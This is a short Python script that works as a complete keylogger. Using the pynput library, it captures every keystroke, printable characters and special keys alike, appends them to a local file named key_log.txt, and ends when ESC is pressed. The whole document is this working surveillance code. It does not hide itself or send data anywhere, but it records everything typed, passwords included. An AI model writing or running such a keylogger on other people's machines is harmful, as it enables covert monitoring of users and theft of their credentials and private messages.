from pynput.keyboard import Key, Listener

# File to save the key logs
log_file = "key_log.txt"

# Function to write keystrokes to a file
def on_press(key):
    try:
        with open(log_file, "a") as f:
            # Log the key pressed, formatted as a string
            f.write(f"{key.char}")
    except AttributeError:
        # Handle special keys (e.g., Shift, Enter, etc.)
        with open(log_file, "a") as f:
            f.write(f" {str(key)} ")

# Function to stop the listener (optional)
def on_release(key):
    # Stop the listener when ESC is pressed
    if key == Key.esc:
        return False

# Set up the listener to monitor key presses
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

